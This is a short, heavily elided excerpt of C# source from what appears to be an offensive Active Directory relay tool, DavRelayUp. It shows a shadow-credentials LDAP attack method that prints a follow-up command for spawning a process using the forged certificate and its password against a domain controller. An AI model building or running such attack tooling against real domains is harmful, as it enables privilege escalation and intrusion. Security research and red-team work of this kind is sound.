...
namespace DavRelayUp.Relay.Attacks.Ldap
{
    class ShadowCred
    {
        public static LdapStatus Attack(IntPtr ld)
        {
            if (Options.attackDone)
                return LdapStatus.LDAP_SUCCESS;
            ...
            if (Options.phase != Options.PhaseType.Full)
            {
                ...
                Console.WriteLine($"    ./DavRelayUp.exe spawn -m shadowcred -d {Options.domain} -dc {Options.domainController} -ce {Options.shadowCredCertificate} -cep {Options.shadowCredCertificatePassword}");
            }
            else
            {
